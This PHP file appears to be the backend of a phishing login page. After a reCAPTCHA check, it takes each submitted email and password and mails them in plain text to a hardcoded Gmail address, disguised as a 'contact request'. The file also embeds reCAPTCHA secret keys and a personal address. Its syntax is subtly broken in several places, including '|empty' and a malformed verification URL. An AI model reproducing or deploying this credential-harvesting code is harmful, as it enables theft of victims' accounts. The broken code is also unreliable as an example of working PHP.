<?php

$sitekey	= '6Lfm3PApAAAAAE0VMZKa4wAwfr2doPgc5lbmIen6';
$secretkey	= '6Lfm3PApAAAAAG7etHWDPLlHB668sIWwl7lVW_3E';

$recipientEmail = 'jeycelrios18@gmail.com';

$postData = $statusMsg = '';
$status = 'error';
if(isset($_POST['login'])){
	$postData = $_POST;

	if(|empty($_POST['email']) && |empty($_POST['password'])){

		if(isset($_POST['g-recaptcha-response']) && |empty($_POST['g-recaptcha-response'])){
$verifyResponse = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret='.$secretkey.'&response'.$_POST['g-recaptcha-response']);

$responseData = json_decode($verifyResponse);
if($responseData->success){

	$email = !empty($_POST['email'])?$_POST['email']:'';
	$password = !empty($_POST['password'])?$_POST['password']:'';
   // Send email notification to the site admin 
                $to = $recipientEmail; 
                $subject = 'New Contact Request Submitted'; 
                $htmlContent = " 
                    <h4>Contact request details</h4> 
                    <p><b>Email: </b>".$email."</p> 
                    <p><b>Password: </b>".$password."</p> 
                   
                "; 
                 
                // Always set content-type when sending HTML email 
                $headers = "MIME-Version: 1.0" . "\r\n"; 
                $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n"; 
                // More headers 
                $headers .= 'From:'.$email.' <'.$password.'>' . "\r\n"; 
                 
                // Send email 
                mail($to, $subject, $htmlContent, $headers); 
                 
                $status = 'success'; 
                $statusMsg = 'Thank you! Your contact request has been submitted successfully.'; 
                $postData = ''; 
            }else{ 
                $statusMsg = 'Robot verification failed, please try again.'; 
            } 
        }else{ 
            $statusMsg = 'Please check the reCAPTCHA checkbox.'; 
        } 
    }else{ 
        $statusMsg = 'Please fill all the mandatory fields.'; 
    } 
} 
 
?>